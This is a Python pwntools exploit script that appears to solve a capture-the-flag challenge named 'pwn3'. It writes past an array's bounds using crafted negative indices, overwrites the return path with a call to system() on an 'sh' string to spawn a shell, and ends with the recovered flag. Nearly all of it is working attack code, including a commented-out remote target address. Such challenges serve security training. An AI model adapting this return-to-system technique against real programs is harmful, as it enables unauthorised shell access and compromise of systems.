#!/usr/bin/env python
from pwn import *
from ctypes import c_int
# context(arch='i386', os='linux', log_level='debug')

elf = ELF('pwn3')

pr = process('./pwn3') 
# pr = remote('114.55.40.165', 8000)

def chg(x):
	assert(x & 3 == 0)
	tmp = c_int(0x80000000 | (x >> 2))
	return str(tmp.value)

pr.recvuntil("Enter your name \n")
pr.sendline('aaa')

sysaddr = elf.symbols['system']  
sh_addr = next(elf.search("sh\0"))

payload = [0 for _ in range(10)]
payload[0] = sysaddr
payload[1] = 0xdeadbeaf
payload[2] = sh_addr

for i in range(10):
	pr.recvuntil("enter index\n")
	pr.sendline(chg(56+i*4))
	pr.recvuntil("enter value\n")
	pr.sendline(str(payload[i]))

pr.recvuntil('your input\n')
pr.interactive()

# FLAG{never_g1ve_up}